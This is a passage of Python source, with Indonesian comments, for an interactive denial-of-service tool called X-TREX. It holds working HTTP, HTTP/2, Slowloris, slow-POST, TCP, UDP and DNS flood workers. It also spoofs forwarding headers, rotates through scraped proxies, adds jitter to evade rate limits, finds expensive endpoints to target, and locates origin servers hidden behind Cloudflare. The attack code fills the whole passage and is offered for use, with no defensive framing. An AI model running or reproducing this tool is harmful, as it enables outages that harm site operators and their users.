            raise ConnectionError(f"socks5 connect rc={resp[1] if len(resp) > 1 else -1}")
        if tls:
            ctx = ssl._create_unverified_context()
            if alpn:
                try: ctx.set_alpn_protocols(alpn)
                except Exception: pass
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock
    sock.close()
    raise ValueError(f"unknown proxy kind {kind}")


def _connect_target(ctx, alpn=None):
    """Proxy dulu, fallback direct. Proxy mati masuk blacklist otomatis."""
    cfg = ctx.cfg
    if ctx.proxies:
        pool = proxy_live_pool(ctx.proxies)
        if pool:
            proxy = random.choice(pool)
            try:
                return via_proxy(proxy, cfg["host"], cfg["port"], cfg["tls"], alpn=alpn), "proxy"
            except Exception:
                proxy_mark_dead(proxy)
    ip = random.choice(ctx.ips)
    return direct_connect(ip, cfg["port"], cfg["tls"], cfg["host"]), "direct"


def build_http_request(ctx):
    cfg = ctx.cfg
    path = ctx.pick_path()
    sep = "&" if "?" in path else "?"
    method = random.choice(["GET", "GET", "GET", "HEAD", "POST"])
    body = b""
    if method == "POST":
        mode = cfg.get("payload_mode", "rand")
        size = min(cfg.get("udp_size", 1024), 4096)
        if mode == "json":
            body = b'{"k":"' + rstr(max(2, size // 2)).encode() + b'"}'
        elif mode == "form":
            body = b"k=" + rstr(max(2, size // 2)).encode()
        else:
            body = os.urandom(size)
    hdr = (
        f"{method} {path}{sep}{rstr(8)}={rstr(12)} HTTP/1.1\r\n"
        f"Host: {cfg['host']}\r\n"
        f"User-Agent: {random.choice(UA_POOL)}\r\n"
        f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
        f"Accept-Language: en-US,en;q=0.9\r\n"
        f"Accept-Encoding: gzip, deflate, br\r\n"
        f"Referer: {random.choice(REFS)}\r\n"
        f"Connection: close\r\n"
        f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
        f"X-Real-IP: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
        f"Cookie: s={rstr(24)}; _ga=GA{rstr(10)}\r\n"
    ).encode()
    if body:
        ct = "application/json" if cfg.get("payload_mode") == "json" else "application/x-www-form-urlencoded"
        hdr += f"Content-Type: {ct}\r\nContent-Length: {len(body)}\r\n".encode()
    hdr += b"\r\n" + body
    return hdr

# ═══════════════════════════════════════════════════════════════════
# WORKERS
# ═══════════════════════════════════════════════════════════════════
def worker_http(ctx):
    while not ctx.stop.is_set():
        try:
            s, _ = _connect_target(ctx)
            req = build_http_request(ctx)
            s.sendall(req)
            ctx.stats.bump(len(req), True)
            try: s.recv(512)
            except Exception: pass
            s.close()
            ctx.jitter()
        except Exception as e:
            ctx.stats.bump(0, False, e)


H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def _h2_frame(t, flags, sid, payload):
    return (len(payload).to_bytes(3, "big") + bytes([t, flags]) +
            struct.pack("!I", sid & 0x7FFFFFFF) + payload)

def _h2_lit(i, v):
    b = v.encode()
    return bytes([i]) + bytes([len(b)]) + b

def _h2_new(n, v):
    nb = n.encode(); vb = v.encode()
    return b"\x00" + bytes([len(nb)]) + nb + bytes([len(vb)]) + vb

def _h2_block(ctx):
    path = ctx.pick_path()
    sep = "&" if "?" in path else "?"
    b = b""
    b += _h2_lit(2, "GET"); b += _h2_lit(7, "https")
    b += _h2_lit(4, path + sep + rstr(8))
    b += _h2_lit(1, ctx.cfg["host"])
    b += _h2_new("user-agent", random.choice(UA_POOL))
    b += _h2_new("x-forwarded-for",
                 f"{random.randint(1,255)}.{random.randint(0,255)}."
                 f"{random.randint(0,255)}.{random.randint(0,255)}")
    b += _h2_new("cookie", "s=" + rstr(24))
    return b


def worker_h2(ctx):
    while not ctx.stop.is_set():
        try:
            s, _ = _connect_target(ctx, alpn=["h2"])
            if s.selected_alpn_protocol() != "h2":
                try: s.close()
                except Exception: pass
                continue
            s.sendall(H2_PREFACE + _h2_frame(0x4, 0x0, 0, b""))
            ctx.stats.bump(len(H2_PREFACE) + 9, True)
            try:
                s.settimeout(2.0)
                buf = s.recv(65535)
                if len(buf) >= 9 and buf[3] == 0x4:
                    s.sendall(_h2_frame(0x4, 0x1, 0, b""))
            except socket.timeout:
                pass
            finally:
                s.settimeout(6)
            for i in range(random.randint(15, 40)):
                if ctx.stop.is_set():
                    break
                sid = 1 + 2 * random.randint(1, 0x3FFFFFF)
                blk = _h2_block(ctx)
                s.sendall(_h2_frame(0x1, 0x5, sid, blk))
                ctx.stats.bump(9 + len(blk), True)
                ctx.jitter()
            try: s.close()
            except Exception: pass
        except Exception as e:
            ctx.stats.bump(0, False, e)


def worker_slow(ctx):
    cfg = ctx.cfg
    pool = []
    while not ctx.stop.is_set():
        try:
            s, _ = _connect_target(ctx)
            path = ctx.pick_path()
            sep = "&" if "?" in path else "?"
            s.sendall(
                f"GET {path}{sep}{rstr(6)} HTTP/1.1\r\n"
                f"Host: {cfg['host']}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n".encode()
            )
            pool.append((s, time.time()))
            ctx.stats.bump(64, True)
        except Exception as e:
            ctx.stats.bump(0, False, e)
        now = time.time()
        for entry in list(pool):
            s, ts = entry
            try:
                s.sendall(f"X-{rstr(4)}: {rstr(random.randint(5, 15))}\r\n".encode())
                ctx.stats.bump(20, True)
                if now - ts > 120:
                    s.close()
                    try: pool.remove(entry)
                    except ValueError: pass
            except Exception:
                try: pool.remove(entry)
                except ValueError: pass
        if len(pool) > 50:
            for entry in pool[:20]:
                try: entry[0].close()
                except Exception: pass
                try: pool.remove(entry)
                except ValueError: pass
        time.sleep(random.uniform(2, 5))


def worker_ruddy(ctx):
    cfg = ctx.cfg
    while not ctx.stop.is_set():
        try:
            s, _ = _connect_target(ctx)
            path = ctx.pick_path()
            total = random.randint(200_000, 800_000)
            s.sendall(
                f"POST {path} HTTP/1.1\r\nHost: {cfg['host']}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {total}\r\nConnection: keep-alive\r\n\r\n".encode()
            )
            ctx.stats.bump(160, True)
            sent = 0
            while sent < total and not ctx.stop.is_set():
                chunk = os.urandom(random.randint(1, 8))
                s.sendall(chunk)
                ctx.stats.bump(len(chunk), True)
                sent += len(chunk)
                time.sleep(random.uniform(0.4, 1.6))
            try: s.close()
            except Exception: pass
        except Exception as e:
            ctx.stats.bump(0, False, e)
            time.sleep(0.8)


def worker_tcp(ctx):
    while not ctx.stop.is_set():
        try:
            s, _ = _connect_target(ctx)
            s.sendall(b"\x00" * 64)
            ctx.stats.bump(64, True)
            try: s.close()
            except Exception: pass
        except Exception as e:
            ctx.stats.bump(0, False, e)


def worker_udp(ctx):
    cfg = ctx.cfg
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while not ctx.stop.is_set():
        try:
            body = os.urandom(cfg.get("udp_size", 1200))
            s.sendto(body, (random.choice(ctx.ips), cfg["port"]))
            ctx.stats.bump(len(body), True)
        except Exception as e:
            ctx.stats.bump(0, False, e)
    try: s.close()
    except Exception: pass


def _dns_pkt():
    tx = random.randint(0, 0xFFFF).to_bytes(2, "big")
    hdr = tx + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00"
    qn = b""
    for _ in range(random.randint(3, 5)):
        seg = rstr(random.choice([2, 3])).lower().encode()
        qn += bytes([len(seg)]) + seg
    qn += b"\x00"
    return hdr + qn + random.choice([b"\x00\x01", b"\x00\xff"]) + b"\x00\x01"


def worker_dns(ctx):
    cfg = ctx.cfg
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while not ctx.stop.is_set():
        try:
            pkt = _dns_pkt()
            s.sendto(pkt, (random.choice(ctx.ips), cfg["port"]))
            ctx.stats.bump(len(pkt), True)
        except Exception as e:
            ctx.stats.bump(0, False, e)
    try: s.close()
    except Exception: pass


WORKERS = {
    "http": worker_http, "h2": worker_h2, "slow": worker_slow,
    "ruddy": worker_ruddy, "tcp": worker_tcp, "udp": worker_udp,
    "dns": worker_dns,
}


def pick_worker(name, ctx):
    if name in WORKERS:
        return threading.Thread(target=WORKERS[name], args=(ctx,), daemon=True)
    if name == "mixed":
        return pick_worker(random.choice(list(WORKERS.keys())), ctx)
    raise ValueError(f"vektor tidak dikenal: {name}")

# ═══════════════════════════════════════════════════════════════════
# FIRE — orkestrasi satu sesi flood
# ═══════════════════════════════════════════════════════════════════
def fire(sess, metode):
    cfg = sess["cfg"]
    if not cfg["host"]:
        print(f"  {C.Rd}[!] target kosong{C.R}")
        input(f"  {C.D}enter…{C.R}"); return

    print(f"\n  {C.D}resolve {cfg['host']}…{C.R}")
    ips = resolve(cfg["host"])
    if not ips:
        print(f"  {C.Rd}[!] gagal resolve — cek jaringan{C.R}")
        input(f"  {C.D}enter…{C.R}"); return
    print(f"  {C.G}»  {len(ips)} IP: {', '.join(ips[:4])}{' …' if len(ips) > 4 else ''}{C.R}")

    proxies = []
    if cfg.get("use_proxies"):
        print()
        proxies = get_proxies()
        if not proxies:
            print(f"  {C.Y}[!] proxy kosong — flood direct dari IP lokal{C.R}")
        else:
            proxy_clear_blacklist()

    endpoints = []
    if cfg.get("use_endpoints") and os.path.exists(ENDPOINT_FILE):
        endpoints = load_endpoints(top=10)
        if endpoints:
            print(f"  {C.G}»  {len(endpoints)} endpoint mahal di-load{C.R}")

    stats = Stats()
    stop = threading.Event()
    ctx = Ctx(cfg, ips, proxies, endpoints, stats, stop)

    cls()
    print(C.Cy + C.B + f"""
  ╔══════════════════════════════════════════════════════╗
  ║   X-TREX ACTIVE — {metode.upper():<10} — {cfg['host'][:20]:<20}   ║
  ╚══════════════════════════════════════════════════════╝""" + C.R)
    print(f"  {C.D}target   {C.R}{C.G}{cfg['host']}:{cfg['port']}  tls={cfg['tls']}")
    print(f"  {C.D}thread   {C.R}{cfg['threads']}")
    print(f"  {C.D}durasi   {C.R}{cfg['duration']}s")
    print(f"  {C.D}proxy    {C.R}{len(proxies)} aktif")
    print(f"  {C.D}endpoint {C.R}{len(endpoints)} pool")
    print(f"  {C.D}stealth  {C.R}{cfg.get('stealth', False)}")
    print(f"  {C.D}UA pool  {C.R}{len(UA_POOL)} varian")
    print(f"  {C.D}{'─'*54}{C.R}\n")

    stats.reset()
    stats.start_print()

    for _ in range(cfg["threads"]):
        pick_worker(metode, ctx).start()

    t0 = time.time()
    try:
        if cfg["duration"] > 0:
            time.sleep(cfg["duration"])
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print()
    stop.set()
    stats.stop_print()
    time.sleep(0.8)

    snap = stats.snap()
    elapsed = time.time() - t0
    print(f"\n  {C.G}■  selesai.{C.R}  paket {snap['p']}  byte {snap['b']}  "
          f"ok {snap['o']}  fail {snap['f']}  durasi {elapsed:.0f}s")
    if snap["e"]:
        for e in snap["e"][-3:]:
            print(f"  {C.Rd}· {e}{C.R}")
    log_session(
        f"{time.strftime('%H:%M:%S')} | {metode:<5} | {cfg['host']}:{cfg['port']} "
        f"| prox={len(proxies)} ep={len(endpoints)} th={cfg['threads']} ua={len(UA_POOL)} "
        f"| pkt={snap['p']} ok={snap['o']} fail={snap['f']} dur={elapsed:.0f}s"
    )
    input(f"\n  {C.D}enter untuk kembali…{C.R}")

# ═══════════════════════════════════════════════════════════════════
# UI HELPERS
# ═══════════════════════════════════════════════════════════════════
def banner(sub="menu utama"):
    cls()
    print(C.Cy + C.B + r"""
   ██╗  ██╗       ████████╗██████╗ ███████╗██╗  ██╗
   ╚██╗██╔╝       ╚══██╔══╝██╔══██╗██╔════╝╚██╗██╔╝
    ╚███╔╝   ███╗   ██║   ██████╔╝█████╗   ╚███╔╝
    ██╔██╗   ╚══╝   ██║   ██╔══██╗██╔══╝   ██╔██╗
   ██╔╝ ██╗         ██║   ██║  ██║███████╗██╔╝ ██╗
   ╚═╝  ╚═╝         ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝""" + C.R)
    print(C.Mg + f"           x-trex v1.2 · {sub}" + C.R)
    print(C.D  + "           " + "─" * 46 + C.R)


def info(k, v):
    print(f"  {C.D}{k:<12}{C.R} {C.G}{v}{C.R}")


def ask(text, default=""):
    try:
        if default != "" and default is not None:
            v = input(f"  {C.Y}{text}{C.R} {C.D}[{default}]{C.R}: ").strip()
            return v if v else str(default)
        return input(f"  {C.Y}{text}{C.R}: ").strip()
    except (EOFError, KeyboardInterrupt):
        return str(default) if default != "" else ""


def ask_int(text, default):
    v = ask(text, default)
    try:
        return int(v)
    except Exception:
        return default


def ask_bool(text, default=False):
    d = "y" if default else "n"
    v = ask(f"{text} y/n", d).lower()
    return v in ("y", "ya", "yes", "1", "true")

# ═══════════════════════════════════════════════════════════════════
# MENU VEKTOR
# ═══════════════════════════════════════════════════════════════════
VEKTOR = [
    ("1", "http",  "HTTP/1.1 Flood",     "GET/POST/HEAD · proxy + endpoint rotasi"),
    ("2", "h2",    "HTTP/2 Multiplex",   "ALPN h2 · 15-40 stream per koneksi"),
    ("3", "slow",  "Slowloris",          "header paruh · worker pool exhaust"),
    ("4", "ruddy", "R-U-Dead-Yet",       "slow POST body · connection exhaust"),
    ("5", "tcp",   "TCP Connect Flood",  "3-way handshake terus-menerus"),
    ("6", "udp",   "UDP Flood",          "payload acak ukuran custom"),
    ("7", "dns",   "DNS Query Flood",    "label acak · A/ANY"),
    ("8", "mixed", "Mixed Multi-Vector", "acak semua vektor"),
]
VMAP = {k: m for k, m, _, _ in VEKTOR}
VLABEL = {m: label for _, m, label, _ in VEKTOR}


def sub_vektor(sess, kode):
    metode = VMAP[kode]
    label = VLABEL[metode]
    cfg = sess["cfg"]

    banner(f"vektor · {label}")
    print()
    info("vektor", metode)
    print(f"  {C.D}{'─'*46}{C.R}\n")

    if cfg["host"]:
        url = ask("URL / host target (kosong = pakai tersimpan)", cfg["host"])
    else:
        url = ask("URL / host target", "")

    if not url:
        print(f"  {C.Rd}[!] target kosong{C.R}")
        input(f"  {C.D}enter…{C.R}"); return

    h, port, tls, path = parse_url(url)
    if metode == "dns":
        port = 53
    if metode == "h2" and port == 80:
        port = 443; tls = True
    cfg["host"] = h
    cfg["port"] = port
    cfg["tls"] = tls
    cfg["path"] = path

    cfg["threads"] = ask_int("threads", cfg["threads"])
    cfg["duration"] = ask_int("durasi detik (0=∞)", cfg["duration"])
    cfg["use_proxies"] = ask_bool("pakai proxy auto-scrape", cfg.get("use_proxies", True))
    cfg["use_endpoints"] = ask_bool("pakai endpoint hunter pool", cfg.get("use_endpoints", True))
    if metode in ("http", "h2", "slow", "ruddy"):
        cfg["stealth"] = ask_bool("stealth jitter (rate-limit evade)", cfg.get("stealth", False))
    save_cfg()

    banner(f"konfirmasi · {label}")
    print()
    info("vektor", metode)
    info("target", f"{cfg['host']}:{cfg['port']}")
    info("tls", cfg["tls"])
    info("path", cfg["path"])
    info("threads", cfg["threads"])
    info("durasi", f"{cfg['duration']}s{' (∞)' if cfg['duration'] == 0 else ''}")
    info("proxy", "auto" if cfg["use_proxies"] else "off")
    info("endpoint", "auto" if cfg["use_endpoints"] else "off")
    info("stealth", cfg["stealth"])
    info("UA pool", f"{len(UA_POOL)} varian")
    print()
    print(f"  {C.G}[1]{C.R} Lanjut — mulai serang")
    print(f"  {C.Rd}[2]{C.R} Batal  — kembali ke menu")
    print()
    p = input(f"{C.G}  pilih> {C.R}").strip().lower()
    if p in ("1", "l", "lanjut", "y", "ya"):
        fire(sess, metode)

# ═══════════════════════════════════════════════════════════════════
# MENU SETTINGS
# ═══════════════════════════════════════════════════════════════════
PROFILES = {
    "light":   {"threads": 30,  "duration": 60,  "stealth": False},
    "medium":  {"threads": 80,  "duration": 120, "stealth": False},
    "heavy":   {"threads": 150, "duration": 300, "stealth": False},
    "stealth": {"threads": 40,  "duration": 240, "stealth": True},
}


def menu_settings(sess):
    cfg = sess["cfg"]
    while True:
        banner("settings")
        print()
        info("threads", cfg["threads"])
        info("duration", cfg["duration"])
        info("stealth", cfg.get("stealth"))
        info("stealth_ms", f"{cfg.get('stealth_min_ms')}-{cfg.get('stealth_max_ms')}")
        info("udp_size", cfg.get("udp_size"))
        info("payload_mode", cfg.get("payload_mode"))
        info("use_proxies", cfg.get("use_proxies"))
        info("use_endpoints", cfg.get("use_endpoints"))
        info("profile", cfg.get("profile"))
        print()
        print(f"  {C.G}[1]{C.R} threads     {C.G}[2]{C.R} duration    {C.G}[3]{C.R} stealth toggle")
        print(f"  {C.G}[4]{C.R} stealth_ms  {C.G}[5]{C.R} udp_size    {C.G}[6]{C.R} payload_mode")
        print(f"  {C.G}[7]{C.R} proxies     {C.G}[8]{C.R} endpoints")
        print(f"  {C.Mg}[p]{C.R} profil preset   {C.Rd}[0]{C.R} kembali")
        print()
        p = input(f"{C.G}  pilih> {C.R}").strip().lower()
        if p in ("0", ""): return
        if p == "1": cfg["threads"] = ask_int("threads", cfg["threads"])
        elif p == "2": cfg["duration"] = ask_int("duration detik", cfg["duration"])
        elif p == "3": cfg["stealth"] = ask_bool("stealth", cfg.get("stealth", False))
        elif p == "4":
            cfg["stealth_min_ms"] = ask_int("min ms", cfg.get("stealth_min_ms", 20))
            cfg["stealth_max_ms"] = ask_int("max ms", cfg.get("stealth_max_ms", 200))
        elif p == "5": cfg["udp_size"] = ask_int("udp payload byte", cfg.get("udp_size", 1200))
        elif p == "6": cfg["payload_mode"] = ask("payload (rand/json/form)", cfg.get("payload_mode", "rand"))
        elif p == "7": cfg["use_proxies"] = ask_bool("use proxies", cfg.get("use_proxies", True))
        elif p == "8": cfg["use_endpoints"] = ask_bool("use endpoints", cfg.get("use_endpoints", True))
        elif p == "p":
            print(f"\n  preset: {', '.join(PROFILES.keys())}")
            name = ask("nama preset", "medium")
            if name in PROFILES:
                for k, v in PROFILES[name].items():
                    cfg[k] = v
                cfg["profile"] = name
        save_cfg()

# ═══════════════════════════════════════════════════════════════════
# MENU PROXY
# ═══════════════════════════════════════════════════════════════════
def menu_proxy(sess):
    banner("proxy manager")
    print()
    cached = load_proxies_cached()
    info("cache file", PROXY_CACHE if os.path.exists(PROXY_CACHE) else "(kosong)")
    info("cache jumlah", len(cached))
    info("auto-load", "on" if sess["cfg"].get("use_proxies") else "off")
    print()
    print(f"  {C.G}[1]{C.R} Re-scrape + health check (overwrite cache)")
    print(f"  {C.G}[2]{C.R} Health-check cache saja")
    print(f"  {C.G}[3]{C.R} Toggle auto-load saat flood")
    print(f"  {C.Rd}[0]{C.R} kembali")
    print()
    p = input(f"{C.G}  pilih> {C.R}").strip()
    if p == "1":
        print()
        live = get_proxies(force_refresh=True, verbose=True)
        print(f"\n  {C.G}»  {len(live)} proxy hidup disimpan ke {PROXY_CACHE}{C.R}")
    elif p == "2":
        if not cached:
            print(f"  {C.Y}[!] cache kosong — scrape dulu{C.R}")
        else:
            print()
            live = check_proxies_parallel(cached, verbose=True)
            save_proxies(live)
            print(f"\n  {C.G}»  {len(live)}/{len(cached)} hidup disimpan{C.R}")
    elif p == "3":
        sess["cfg"]["use_proxies"] = not sess["cfg"].get("use_proxies", True)
        save_cfg()
        print(f"  {C.G}»  auto-load: {sess['cfg']['use_proxies']}{C.R}")
    else:
        return
    input(f"\n  {C.D}enter…{C.R}")

# ═══════════════════════════════════════════════════════════════════
# MENU ENDPOINT
# ═══════════════════════════════════════════════════════════════════
def menu_endpoint(sess):
    banner("endpoint hunter")
    print()
    cfg = sess["cfg"]
    if not cfg["host"]:
        print(f"  {C.Rd}[!] target kosong — set dari menu vektor dulu{C.R}")
        input(f"  {C.D}enter…{C.R}"); return
    info("target", cfg["host"])
    info("tls", cfg["tls"])
    info("file", ENDPOINT_FILE if os.path.exists(ENDPOINT_FILE) else "(kosong)")
    print()
    print(f"  {C.G}[1]{C.R} Hunt endpoint sekarang")
    print(f"  {C.G}[2]{C.R} Toggle auto-load saat flood")
    print(f"  {C.G}[3]{C.R} Lihat top endpoint dari cache")
    print(f"  {C.Rd}[0]{C.R} kembali")
    print()
    p = input(f"{C.G}  pilih> {C.R}").strip()
    if p == "1":
        print()
        max_pages = ask_int("max halaman crawl", 25)
        hasil = hunt_endpoints(cfg["host"], cfg["tls"], verbose=True, max_pages=max_pages)
        if not hasil:
            print(f"  {C.Y}[!] tidak ada endpoint — target mungkin blok crawler{C.R}")
        else:
            save_endpoints(cfg["host"], hasil)
            print(f"\n  {C.Cy}top 15 endpoint mahal:{C.R}\n")
            for i, (p_, sc) in enumerate(hasil[:15], 1):
                warna = C.Rd if sc >= 10 else (C.Y if sc >= 6 else C.G)
                print(f"  {i:<3} {warna}{sc:<5}{C.R} {p_[:65]}")
            print(f"\n  {C.G}»  tersimpan: {ENDPOINT_FILE}{C.R}")
    elif p == "2":
        cfg["use_endpoints"] = not cfg.get("use_endpoints", True)
        save_cfg()
        print(f"  {C.G}»  auto-load: {cfg['use_endpoints']}{C.R}")
    elif p == "3":
        eps = load_endpoints(top=None)
        if not eps:
            print(f"  {C.Y}[!] belum ada endpoint{C.R}")
        else:
            for i, p_ in enumerate(eps[:30], 1):
                print(f"  {i:<3} {p_}")
    else:
        return
    input(f"\n  {C.D}enter…{C.R}")

# ═══════════════════════════════════════════════════════════════════
# MENU ORIGIN
# ═══════════════════════════════════════════════════════════════════
def menu_origin(sess):
    banner("origin IP finder")
    print()
    cfg = sess["cfg"]
    host = ask("domain target", cfg.get("host") or "")
    if not host:
        return
    print()
    non_cf, cf = find_origin(host, verbose=True)
    print()
    if non_cf:
        print(f"  {C.G}host non-Cloudflare (kandidat origin asli):{C.R}")
        items = list(non_cf.items())
        for h_, ips_ in items:
            print(f"    {C.Cy}{h_:<40}{C.R} → {', '.join(ips_)}")
        if ask_bool("set salah satu sebagai target flood", False):
            pick = ask("host kandidat", items[0][0])
            if pick in non_cf:
                cfg["host"] = pick
                save_cfg()
                print(f"  {C.G}»  target sekarang: {pick}{C.R}")
    else:
        print(f"  {C.Y}[!] tidak ada host non-CF — origin mungkin di-hide{C.R}")
    if cf:
        print(f"\n  {C.D}via Cloudflare: {', '.join(list(cf.keys())[:8])}{C.R}")
    input(f"\n  {C.D}enter…{C.R}")

# ═══════════════════════════════════════════════════════════════════
# MENU INFO
# ═══════════════════════════════════════════════════════════════════
def menu_info(sess):
    banner("info")
    print()
    for k, v in sess["cfg"].items():
        info(k, v)
    print()
    info("UA_pool", f"{len(UA_POOL)} varian")
    info("config_file", CFG_FILE)
    info("proxy_cache", PROXY_CACHE if os.path.exists(PROXY_CACHE) else "-")
    info("endpoint_file", ENDPOINT_FILE if os.path.exists(ENDPOINT_FILE) else "-")
    info("log_dir", LOG_DIR)
    input(f"\n  {C.D}enter…{C.R}")

# ═══════════════════════════════════════════════════════════════════
# MENU UTAMA
# ═══════════════════════════════════════════════════════════════════
def menu_utama(sess):
    banner()
    cfg = sess["cfg"]
    print()
    if cfg["host"]:
        print(f"  {C.D}target  {C.R}{C.G}{cfg['host']}{C.R}{C.D}:{cfg['port']}  "
              f"thread {cfg['threads']}  durasi {cfg['duration']}s  ua {len(UA_POOL)}{C.R}\n")
    else:
        print(f"  {C.D}belum ada target — pilih vektor untuk isi URL{C.R}\n")

    print(f"  {C.Cy}╭─ VEKTOR ─────────────────────────────────────────╮{C.R}")
    for k, m, label, desc in VEKTOR:
        print(f"  {C.Cy}│{C.R} {C.G}[{k}]{C.R} {label:<22}{C.D}{desc}{C.R}")
    print(f"  {C.Cy}╰──────────────────────────────────────────────────╯{C.R}")
    print()
    print(f"  {C.Cy}╭─ TOOLS ──────────────────────────────────────────╮{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[x]{C.R} Proxy Manager   {C.D}scrape + health-check + cache{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[e]{C.R} Endpoint Hunter {C.D}crawl + skor endpoint mahal{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[o]{C.R} Origin Finder   {C.D}cari IP asli di balik CF{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[s]{C.R} Settings        {C.D}thread/durasi/stealth/payload{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[i]{C.R} Info            {C.D}config aktif + paths{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Rd}[q]{C.R} Keluar{C.R}")
    print(f"  {C.Cy}╰──────────────────────────────────────────────────╯{C.R}")
    print()

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    load_cfg()
    sess = {"cfg": CFG}
    try:
        while True:
            menu_utama(sess)
            p = input(f"{C.G}  xtrex ▸ {C.R}").strip().lower()
            if p in ("q", "quit", "exit", "0"):
                break
            if p in VMAP:
                sub_vektor(sess, p); continue
            if p in ("x", "proxy"):
                menu_proxy(sess); continue
            if p in ("e", "endpoint"):
                menu_endpoint(sess); continue
            if p in ("o", "origin"):
                menu_origin(sess); continue
            if p in ("s", "settings"):
                menu_settings(sess); continue
            if p in ("i", "info"):
                menu_info(sess); continue
            if not p:
                continue
            print(f"  {C.Rd}[!] tidak dikenal: {p}{C.R}")
            time.sleep(0.6)
    except KeyboardInterrupt:
        pass
    cls()
    print(C.Cy + "\n  X-TREX keluar. config → xtrex.json, log → xtrex-logs/\n" + C.R)


if __name__ == "__main__":
    main()
